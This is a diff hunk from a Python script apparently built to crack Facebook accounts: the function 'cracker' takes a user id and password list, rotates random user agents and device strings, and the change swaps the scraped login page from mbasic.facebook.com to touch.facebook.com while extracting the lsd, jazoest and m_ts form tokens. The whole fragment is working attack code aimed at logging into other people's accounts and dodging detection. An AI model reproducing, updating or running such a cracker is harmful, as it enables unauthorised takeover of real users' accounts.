@@ -3166,7 +3166,7 @@ def cracker(uid, pwx, tl):
             ua = random.choice(uas)
             pro = random.choice(devua)
             ses = requests.Session()
-            p_fb = ses.get("https://mbasic.facebook.com").text
+            p_fb = ses.get("https://touch.facebook.com").text
             lsd = re.search('name="lsd" value="(.*?)"', str(p_fb)).group(1)
             jazoest = re.search('name="jazoest" value="(.*?)"', str(p_fb)).group(1)
             m_ts = re.search('name="m_ts" value="(.*?)"', str(p_fb)).group(1)
